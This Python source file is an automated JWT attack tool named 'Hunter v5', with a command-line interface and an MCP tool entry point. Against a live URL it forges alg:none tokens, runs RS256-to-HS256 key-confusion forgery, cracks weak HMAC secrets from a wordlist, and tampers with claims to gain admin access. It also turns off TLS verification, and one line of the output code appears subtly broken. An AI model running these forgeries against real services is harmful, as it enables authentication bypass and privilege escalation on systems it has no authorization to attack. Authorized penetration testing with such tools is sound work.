"""
Hunter v5 — Auto JWT Engine

Automates JWT vulnerability detection and exploitation:
1. Token decode and analysis
2. Signature verification bypass (unsigned payload)
3. alg:none attack
4. Algorithm confusion (RS256 -> HS256)
5. Weak HMAC secret cracking
6. Claim manipulation (admin, role, expiry)
"""

import base64
import hashlib
import hmac
import json
import time
import os
from typing import Optional

try:
    from tools.probe import _get_session
except (ImportError, ModuleNotFoundError):
    import requests
    def _get_session():
        s = requests.Session()
        s.verify = False
        s.headers.update({'User-Agent': 'Mozilla/5.0'})
        return s

# ---------------------------------------------------------------------------
# Low-level JWT helpers
# ---------------------------------------------------------------------------

def _b64url_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def decode(token: str) -> dict:
    """Decode a JWT token and return header, payload, signature, and static analysis."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return {"error": "Invalid JWT: expected 3 dot-separated parts", "raw": token}

    try:
        header = json.loads(_b64url_decode(parts[0]))
    except Exception as e:
        header = {"_decode_error": str(e), "_raw": parts[0]}

    try:
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception as e:
        payload = {"_decode_error": str(e), "_raw": parts[1]}

    signature = parts[2]

    vulns = []
    alg = header.get("alg", "")

    if alg.lower() == "none":
        vulns.append("alg_none: algorithm is 'none' -- trivial forgery")
    if alg.startswith("HS"):
        vulns.append(f"hmac_weak_key: {alg} is brute-forceable with a weak secret")
    if "exp" in payload:
        try:
            import datetime
            exp_dt = datetime.datetime.fromtimestamp(payload["exp"])
            if exp_dt < datetime.datetime.now():
                vulns.append("expired: token has expired")
        except Exception:
            pass
    for claim in ("role", "admin", "is_admin", "isAdmin", "privilege", "access_level"):
        if claim in payload:
            vulns.append(f"interesting_claim: {claim}={payload[claim]}")

    return {
        "header": header,
        "payload": payload,
        "signature": signature,
        "algorithm": alg,
        "vulnerabilities": vulns,
    }


# ---------------------------------------------------------------------------
# Token forgery helpers (offline, no requests)
# ---------------------------------------------------------------------------

def _build_jwt(header: dict, payload: dict, secret: str = "") -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    message = f"{h}.{p}"

    alg = header.get("alg", "none")
    if alg == "none" or alg.lower() == "none":
        sig = ""
    elif alg.startswith("HS"):
        hash_map = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }
        hf = hash_map.get(alg, hashlib.sha256)
        sig = _b64url_encode(hmac.new(secret.encode(), message.encode(), hf).digest())
    else:
        sig = ""

    return f"{message}.{sig}"


def forge_none(payload: dict) -> str:
    """Create an unsigned JWT with alg=none."""
    header = {"alg": "none", "typ": "JWT"}
    return _build_jwt(header, payload)


def forge_confusion(payload: dict, public_key: str) -> str:
    """Algorithm confusion: sign with HS256 using an RSA public key as the HMAC secret."""
    header = {"alg": "HS256", "typ": "JWT"}
    return _build_jwt(header, payload, public_key)


# ---------------------------------------------------------------------------
# Active scanner
# ---------------------------------------------------------------------------

WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "key", "jwt", "token",
    "test", "changeme", "default", "supersecret", "mysecret",
    "jwt_secret", "jwt-secret", "secretkey", "your-256-bit-secret",
    "your-secret-key", "shhh", "keyboard_cat", "qwerty", "abc123",
    "master", "access", "private", "auth", "session", "signing",
    "", "null", "undefined", "none", "false", "0",
]

HTTP_METHODS = ("GET", "POST")


class AutoJWT:
    """Automated JWT vulnerability scanner."""

    def __init__(self, url: str, token: str = "", cookie: str = "",
                 session=None):
        self.url = url
        self.token = token
        self.cookie_name = cookie  # name of the cookie holding the JWT
        self.session = session or _get_session()
        self.findings: list[dict] = []

    # -- helpers --

    def _request(self, headers: dict = None, cookies: dict = None,
                 method: str = "GET") -> dict:
        """Send a request and return a compact response dict."""
        try:
            h = dict(self.session.headers)
            if headers:
                h.update(headers)

            ck = {}
            if self.cookie_name and self.token:
                ck[self.cookie_name] = self.token
            if cookies:
                ck.update(cookies)

            if method.upper() == "POST":
                resp = self.session.post(
                    self.url, headers=h, cookies=ck,
                    timeout=10, allow_redirects=True,
                )
            else:
                resp = self.session.get(
                    self.url, headers=h, cookies=ck,
                    timeout=10, allow_redirects=True,
                )
            return {
                "status": resp.status_code,
                "length": len(resp.text),
                "body": resp.text[:3000],
            }
        except Exception as e:
            return {"status": 0, "length": 0, "body": "", "error": str(e)}

    def _send_token(self, tok: str, method: str = "GET") -> dict:
        """Send a request with a specific JWT token."""
        headers = {"Authorization": f"Bearer {tok}"}
        cookies = {}
        if self.cookie_name:
            cookies[self.cookie_name] = tok
        return self._request(headers=headers, cookies=cookies, method=method)

    def _send_raw_auth(self, raw_value: str) -> dict:
        """Send with a raw Authorization header value (no Bearer prefix)."""
        return self._request(headers={"Authorization": raw_value})

    def _is_unauthorized(self, resp: dict) -> bool:
        """Check if response indicates auth failure."""
        s = resp.get("status", 0)
        if s in (401, 403):
            return True
        body = resp.get("body", "").lower()
        for kw in ("unauthorized", "forbidden", "invalid token",
                    "access denied", "not authenticated", "login"):
            if kw in body:
                return True
        return False

    def _is_authorized(self, resp: dict, baseline: dict) -> bool:
        """Heuristic: response looks like success compared to baseline."""
        if self._is_unauthorized(resp):
            return False
        # Same status as baseline and reasonable length
        if baseline.get("status") and resp.get("status") == baseline.get("status"):
            if abs(resp.get("length", 0) - baseline.get("length", 0)) < 50:
                return True
        # 200-class is usually success
        s = resp.get("status", 0)
        return 200 <= s < 300

    # -- scanners --

    def _get_baseline(self) -> dict:
        """Get baseline response with original token."""
        if self.token:
            return self._send_token(self.token)
        return self._request()

    def test_no_token(self, baseline: dict) -> dict:
        """Check if the endpoint is accessible without any token."""
        resp = self._request(headers={"Authorization": ""})
        if self._is_authorized(resp, baseline):
            finding = {
                "test": "no_token",
                "severity": "critical",
                "detail": "Endpoint accessible without any authentication token",
                "status": resp.get("status"),
            }
            self.findings.append(finding)
            return finding
        return {"test": "no_token", "vulnerable": False}

    def test_unverified_signature(self, baseline: dict) -> dict:
        """Modify payload and send with original signature to test signature verification."""
        if not self.token:
            return {"test": "unverified_signature", "skipped": True, "reason": "No token provided"}

        parsed = decode(self.token)
        if "error" in parsed:
            return {"test": "unverified_signature", "error": parsed["error"]}

        payload = parsed["payload"]
        header = parsed["header"]
        parts = self.token.split(".")

        # Modify a claim to create a tampered token
        tampered_payload = dict(payload)
        for claim in ("admin", "is_admin", "isAdmin", "role"):
            if claim in tampered_payload:
                tampered_payload[claim] = True if not tampered_payload[claim] else tampered_payload[claim]
                break
        else:
            # Add admin claim if none exists
            tampered_payload["admin"] = True

        tampered_b64 = _b64url_encode(json.dumps(tampered_payload, separators=(",", ":")).encode())
        # Keep original header and signature
        tampered_token = f"{parts[0]}.{tampered_b64}.{parts[2]}"

        resp = self._send_token(tampered_token)
        if self._is_authorized(resp, baseline):
            finding = {
                "test": "unverified_signature",
                "severity": "critical",
                "detail": "Server accepts token with modified payload and original signature",
                "forged_token": tampered_token,
                "modified_claims": tampered_payload,
                "status": resp.get("status"),
            }
            self.findings.append(finding)
            return finding

        return {"test": "unverified_signature", "vulnerable": False,
                "status": resp.get("status")}

    def test_alg_none(self, baseline: dict) -> dict:
        """Test alg:none attack -- forge unsigned token."""
        if not self.token:
            # Forge from scratch with admin claim
            payload = {"admin": True, "user": "admin"}
        else:
            parsed = decode(self.token)
            payload = parsed.get("payload", {})
            payload["admin"] = True

        none_token = forge_none(payload)
        resp = self._send_token(none_token)
        if self._is_authorized(resp, baseline):
            finding = {
                "test": "alg_none",
                "severity": "critical",
                "detail": "Server accepts unsigned JWT with alg=none",
                "forged_token": none_token,
                "status": resp.get("status"),
            }
            self.findings.append(finding)
            return finding

        # Try without 'typ' header (some servers are picky)
        bare_header = {"alg": "none"}
        bare_token = _build_jwt(bare_header, payload)
        resp2 = self._send_token(bare_token)
        if self._is_authorized(resp2, baseline):
            finding = {
                "test": "alg_none_bare",
                "severity": "critical",
                "detail": "Server accepts unsigned JWT with alg=none (no typ header)",
                "forged_token": bare_token,
                "status": resp2.get("status"),
            }
            self.findings.append(finding)
            return finding

        # Try empty signature variation
        parts = none_token.split(".")
        no_sig_token = f"{parts[0]}.{parts[1]}."  # trailing dot
        resp3 = self._send_token(no_sig_token)
        if self._is_authorized(resp3, baseline):
            finding = {
                "test": "alg_none_empty_sig",
                "severity": "critical",
                "detail": "Server accepts JWT with empty signature",
                "forged_token": no_sig_token,
                "status": resp3.get("status"),
            }
            self.findings.append(finding)
            return finding

        return {"test": "alg_none", "vulnerable": False}

    def test_algorithm_confusion(self, baseline: dict, public_key: str = "") -> dict:
        """Test RS256->HS256 key confusion attack."""
        if not self.token:
            return {"test": "algorithm_confusion", "skipped": True, "reason": "No token"}

        parsed = decode(self.token)
        alg = parsed.get("algorithm", "")
        if alg != "RS256":
            return {"test": "algorithm_confusion", "skipped": True,
                    "reason": f"Algorithm is {alg}, not RS256"}

        payload = parsed.get("payload", {})
        payload["admin"] = True

        if not public_key:
            return {
                "test": "algorithm_confusion",
                "status": "needs_public_key",
                "detail": "Token uses RS256. Provide the RSA public key to test key confusion (RS256->HS256).",
                "forged_header": {"alg": "HS256", "typ": "JWT"},
            }

        confused_token = forge_confusion(payload, public_key)
        resp = self._send_token(confused_token)
        if self._is_authorized(resp, baseline):
            finding = {
                "test": "algorithm_confusion",
                "severity": "critical",
                "detail": "Server accepted RS256->HS256 key confusion with public key as HMAC secret",
                "forged_token": confused_token,
                "status": resp.get("status"),
            }
            self.findings.append(finding)
            return finding

        return {"test": "algorithm_confusion", "vulnerable": False,
                "status": resp.get("status")}

    def test_weak_secret(self, baseline: dict, wordlist_path: str = "") -> dict:
        """Crack HMAC secret and forge a new token."""
        if not self.token:
            return {"test": "weak_secret", "skipped": True, "reason": "No token"}

        parsed = decode(self.token)
        alg = parsed.get("algorithm", "")
        if not alg.startswith("HS"):
            return {"test": "weak_secret", "skipped": True,
                    "reason": f"Algorithm {alg} is not HMAC-based"}

        parts = self.token.split(".")
        message = f"{parts[0]}.{parts[1]}".encode()

        try:
            target_sig = _b64url_decode(parts[2])
        except Exception:
            return {"test": "weak_secret", "error": "Failed to decode signature"}

        hash_map = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }
        hf = hash_map.get(alg, hashlib.sha256)

        # Build wordlist
        words = list(WEAK_SECRETS)
        if wordlist_path:
            try:
                with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                    words.extend(line.strip() for line in f if line.strip())
            except Exception:
                pass

        start = time.time()
        tested = 0
        for word in words:
            tested += 1
            mac = hmac.new(word.encode(), message, hf).digest()
            if mac == target_sig:
                elapsed = time.time() - start
                # Forge a new token with the cracked secret
                payload = parsed.get("payload", {})
                payload["admin"] = True
                forged = _build_jwt(parsed.get("header", {}), payload, word)

                # Verify against the live target
                resp = self._send_token(forged)
                live_confirmed = self._is_authorized(resp, baseline)

                finding = {
                    "test": "weak_secret",
                    "severity": "critical",
                    "detail": f"HMAC secret cracked: '{word}'",
                    "secret": word,
                    "algorithm": alg,
                    "tested": tested,
                    "elapsed_ms": int(elapsed * 1000),
                    "forged_token": forged,
                    "live_confirmed": live_confirmed,
                    "status": resp.get("status"),
                }
                self.findings.append(finding)
                return finding

        return {
            "test": "weak_secret",
            "vulnerable": False,
            "algorithm": alg,
            "tested": tested,
            "elapsed_ms": int((time.time() - start) * 1000),
            "hint": "Try a larger wordlist with --wordlist flag",
        }

    def test_claim_manipulation(self, baseline: dict) -> dict:
        """Try common privilege escalation claim modifications."""
        if not self.token:
            return {"test": "claim_manipulation", "skipped": True, "reason": "No token"}

        parsed = decode(self.token)
        header = parsed.get("header", {})
        payload = parsed.get("payload", {})
        parts = self.token.split(".")

        manipulations = [
            {"admin": True},
            {"is_admin": True},
            {"isAdmin": True},
            {"role": "admin"},
            {"role": "administrator"},
            {"access_level": 999},
            {"privilege": "superadmin"},
            {"user": "admin"},
            {"username": "admin"},
        ]

        results = []
        for mod in manipulations:
            tampered = dict(payload)
            tampered.update(mod)
            tampered_b64 = _b64url_encode(json.dumps(tampered, separators=(",", ":")).encode())
            tampered_token = f"{parts[0]}.{tampered_b64}.{parts[2]}"

            resp = self._send_token(tampered_token)
            if self._is_authorized(resp, baseline):
                finding = {
                    "test": "claim_manipulation",
                    "severity": "high",
                    "detail": f"Server accepts token with modified claims: {mod}",
                    "modification": mod,
                    "forged_token": tampered_token,
                    "status": resp.get("status"),
                }
                self.findings.append(finding)
                results.append(finding)
                # Don't break -- find all working mods

        if not results:
            return {"test": "claim_manipulation", "vulnerable": False}
        return {"test": "claim_manipulation", "found": len(results), "details": results}

    # -- full scan --

    def scan(self, public_key: str = "", wordlist: str = "") -> dict:
        """Run the full JWT vulnerability scan."""
        start = time.time()
        results = {
            "target": self.url,
            "token_provided": bool(self.token),
            "decoded": decode(self.token) if self.token else None,
            "tests": [],
        }

        # Baseline
        baseline = self._get_baseline()
        results["baseline"] = {
            "status": baseline.get("status"),
            "length": baseline.get("length"),
        }

        # If baseline itself is unauthorized and no token, nothing to test
        if self._is_unauthorized(baseline) and not self.token:
            results["error"] = "Endpoint requires authentication and no JWT token was provided"
            return results

        # 1. No-token access
        r = self.test_no_token(baseline)
        results["tests"].append(r)

        # 2. Unverified signature
        r = self.test_unverified_signature(baseline)
        results["tests"].append(r)

        # 3. alg:none
        r = self.test_alg_none(baseline)
        results["tests"].append(r)

        # 4. Algorithm confusion
        r = self.test_algorithm_confusion(baseline, public_key)
        results["tests"].append(r)

        # 5. Weak secret cracking
        r = self.test_weak_secret(baseline, wordlist)
        results["tests"].append(r)

        # 6. Claim manipulation
        r = self.test_claim_manipulation(baseline)
        results["tests"].append(r)

        # Summary
        results["findings"] = self.findings
        results["vulnerable"] = bool(self.findings)
        results["finding_count"] = len(self.findings)
        results["elapsed_ms"] = int((time.time() - start) * 1000)

        return results


# ---------------------------------------------------------------------------
# MCP entry point
# ---------------------------------------------------------------------------

def auto_jwt_impl(url: str, token: str = "", cookie: str = "",
                  public_key: str = "", wordlist: str = "") -> dict:
    """Run automated JWT scan. Entry point for MCP tool."""
    scanner = AutoJWT(url, token, cookie)
    return scanner.scan(public_key=public_key, wordlist=wordlist)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def _cli():
    import sys
    if len(sys.argv) < 2:
        print("Usage: python auto_jwt.py <url> [token] [--cookie name] [--pubkey file] [--wordlist file]")
        print()
        print("Examples:")
        print("  python auto_jwt.py https://target.com/api/admin eyJhbG...")
        print("  python auto_jwt.py https://target.com/api/admin --cookie session")
        print("  python auto_jwt.py https://target.com/api/admin eyJhbG... --pubkey pubkey.pem")
        sys.exit(1)

    url = sys.argv[1]
    token = sys.argv[2] if len(sys.argv) > 2 and not sys.argv[2].startswith("--") else ""
    cookie = ""
    pubkey_path = ""
    wordlist_path = ""

    args = sys.argv[2:]
    i = 0
    while i < len(args):
        if args[i] == "--cookie" and i + 1 < len(args):
            cookie = args[i + 1]
            i += 2
        elif args[i] == "--pubkey" and i + 1 < len(args):
            pubkey_path = args[i + 1]
            i += 2
        elif args[i] == "--wordlist" and i + 1 < len(args):
            wordlist_path = args[i + 1]
            i += 2
        else:
            i += 1

    pubkey = ""
    if pubkey_path:
        try:
            with open(pubkey_path, "r") as f:
                pubkey = f.read()
        except Exception as e:
            print(f"[!] Failed to read public key: {e}")

    print(f"[*] Target: {url}")
    print(f"[*] Token: {'provided' if token else 'none'}")
    print(f"[*] Cookie: {cookie or '(none)'}")
    print()

    result = auto_jwt_impl(url, token, cookie, pubkey, wordlist_path)

    # Print decoded token
    if result.get("decoded"):
        d = result["decoded"]
        print("[*] Decoded Token")
        print(f"    Algorithm : {d.get('algorithm', '?')}")
        print(f"    Header    : {json.dumps(d.get('header', {}), indent=2)}")
        print(f"    Payload   : {json.dumps(d.get('payload', {}), indent=2)}")
        if d.get("vulnerabilities"):
            print(f"    Static Vulns:")
            for v in d["vulnerabilities"]:
                print(f"      - {v}")
        print()

    # Print baseline
    bl = result.get("baseline", {})
    print(f"[*] Baseline: status={bl.get('status')} length={bl.get('length')}")
    print()

    # Print test results
    for t in result.get("tests", []):
        test_name = t.get("test", "?")
        vuln = "vulnerable" in t and not t.get("vulnerable") is False
        found = "severity" in t
        skipped = t.get("skipped", False)

        if skipped:
            print(f"    [-] {test_name}: SKIPPED ({t.get('reason', '')})")
        elif found:
            print(f"    [!] {test_name}: VULNERABLE")
            print(f"        Severity : {t.get('severity', '?')}")
            print(f"        Detail   : {t.get('detail', '')}")
            if t.get("forged_token"):
                ft = t["forged_token"]
                print(f"        Token    : {ft[:80]}{'...' if len(ft) > 80 else ''}")
            if t.get("secret"):
                print(f"        Secret   : {t['secret']}")
        elif "status" in t.get("status", {}):
            print(f"    [+] {test_name}: needs data ({t.get('detail', t.get('status', ''))})")
        else:
            print(f"    [OK] {test_name}: not vulnerable")

    print()
    if result.get("vulnerable"):
        print(f"[!] VULNERABLE -- {result['finding_count']} finding(s) in {result['elapsed_ms']}ms")
        for f in result["findings"]:
            print(f"    >> {f.get('test')}: {f.get('detail', '')}")
    else:
        print(f"[OK] No JWT vulnerabilities found ({result['elapsed_ms']}ms)")

    return result


if __name__ == "__main__":
    _cli()
